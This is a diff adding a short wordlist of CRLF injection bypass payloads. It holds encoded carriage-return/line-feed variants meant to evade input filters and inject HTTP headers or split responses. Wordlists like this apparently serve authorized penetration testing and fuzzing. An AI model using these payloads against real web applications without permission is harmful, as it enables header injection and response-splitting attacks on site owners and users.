@@ -1,0 +1,24 @@
+# CRLF Bypass Payloads
+# Double Encoding
+%250d%250a
+%25%30%64%25%30%61
+# Unicode
+%u000d%u000a
+%E5%98%8A%E5%98%8D
+# Mixed
+%0d%0a%20
+%0d%0a%09
+%0d%20%0a
+# URL Encoded Variations
+%0D%0A
+%0d%0A
+%0D%0a
+# Null Byte
+%00%0d%0a
+%0d%00%0a
+# Tab/Space
+%09%0d%0a
+%20%0d%0a
+# Multiple CRLF
+%0d%0a%0d%0a
+%0a%0d%0a%0d
